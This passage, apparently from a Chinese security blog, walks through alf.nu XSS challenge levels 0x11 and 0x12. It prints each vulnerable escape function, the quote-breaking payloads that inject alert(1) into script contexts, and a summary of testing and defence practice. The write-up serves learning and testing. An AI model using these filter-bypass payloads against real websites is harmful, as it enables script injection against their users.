+<h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line"><span class="keyword">function</span> render (s) &#123;</span><br><span class="line">  <span class="keyword">function</span> escapeJs (s) &#123;</span><br><span class="line">    <span class="built_in">return</span> String(s)</span><br><span class="line">            .replace(/\\/g, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(/<span class="string">'/g, '</span>\\\<span class="string">''</span>)</span><br><span class="line">            .replace(/<span class="string">"/g, '\\"</span><span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/`/g, '</span>\\`<span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/&lt;/g, '</span>\\74<span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/&gt;/g, '</span>\\76<span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/\//g, '</span>\\/<span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/\n/g, '</span>\\n<span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/\r/g, '</span>\\r<span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/\t/g, '</span>\\t<span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/\f/g, '</span>\\f<span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/\v/g, '</span>\\v<span class="string">')</span></span><br><span class="line"><span class="string">            // .replace(/\b/g, '</span>\\b<span class="string">')</span></span><br><span class="line"><span class="string">            .replace(/\0/g, '</span>\\0<span class="string">')</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  s = escapeJs(s)</span></span><br><span class="line"><span class="string">  return `</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = '</span>javascript:console.log(<span class="string">"<span class="variable">$&#123;s&#125;</span>"</span>)<span class="string">'</span></span><br><span class="line"><span class="string">  var a = document.createElement('</span>a<span class="string">')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()&lt;script&gt;console.log("\\");alert(1)//");&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这个过滤就吓到我了</p>
+<p>不过直接,分割就可以了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"),alert(1)//</span></span><br></pre></td></tr></table></figure>
+<p>html:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  var url = <span class="string">'javascript:console.log("\"),alert(1)\/\/")'</span></span><br><span class="line">  var a = document.createElement(<span class="string">'a'</span>)</span><br><span class="line">  a.href = url</span><br><span class="line">  document.body.appendChild(a)</span><br><span class="line">  a.click()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>像这种script标签内的输出，确实是很难防御啊。</p>
+<h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// from alf.nu</span><br><span class="line"><span class="keyword">function</span> escape (s) &#123;</span><br><span class="line">  s = s.replace(/<span class="string">"/g, '\\"</span><span class="string">')</span></span><br><span class="line"><span class="string">  return '</span>&lt;script&gt;console.log(<span class="string">"' + s + '"</span>);&lt;/script&gt;<span class="string">'</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">");alert(1)//</span></span><br></pre></td></tr></table></figure>
+<p>html:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;console.log(<span class="string">"\\"</span>);alert(1)//<span class="string">");&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>就可以了。</p>
+<p>总结</p>
+<p>其实这个闯关本身没什么太大的价值，关键是其中的绕过方式，放在我们平时的测试工作中，首先就是svg标签的测试，然后是img，最后看看会不会有script标签没过滤的情况，基本上说实话很少，所以说这种漏洞现在也就是玩玩，一般的话防御其实很简单，直接转义&lt;&gt;就可以了真的是什么都不用管，不过有的产品有需求可能就需要过滤，那么我见到的比较狠的就是不能回车是前提，然后过滤这个on事件和src之类的时间然后是svg和script的标签过滤，甚至可以限制长度输入，不过这些都是过后台的，前端的dom型xss确实难防，也没研究过。后面可以好好研究一下。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/03/从栈溢出到getshell/" rel="next" title="从栈溢出到getshell">
+                <i class="fa fa-chevron-left"></i> 从栈溢出到getshell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Binarever</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简述xss"><span class="nav-number">2.</span> <span class="nav-text">简述xss</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00"><span class="nav-number">3.</span> <span class="nav-text">0x00</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01"><span class="nav-number">4.</span> <span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02"><span class="nav-number">5.</span> <span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03"><span class="nav-number">6.</span> <span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04"><span class="nav-number">7.</span> <span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05"><span class="nav-number">8.</span> <span class="nav-text">0x05</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x06"><span class="nav-number">9.</span> <span class="nav-text">0x06</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x07"><span class="nav-number">10.</span> <span class="nav-text">0x07</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x08"><span class="nav-number">11.</span> <span class="nav-text">0x08</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x09"><span class="nav-number">12.</span> <span class="nav-text">0x09</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0A"><span class="nav-number">13.</span> <span class="nav-text">0x0A</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0B"><span class="nav-number">14.</span> <span class="nav-text">0x0B</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0C"><span class="nav-number">15.</span> <span class="nav-text">0x0C</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0D"><span class="nav-number">16.</span> <span class="nav-text">0x0D</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0E"><span class="nav-number">17.</span> <span class="nav-text">0x0E</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0F"><span class="nav-number">18.</span> <span class="nav-text">0x0F</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x10"><span class="nav-number">19.</span> <span class="nav-text">0x10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x11"><span class="nav-number">20.</span> <span class="nav-text">0x11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x12"><span class="nav-number">21.</span> <span class="nav-text">0x12</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Binarever</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
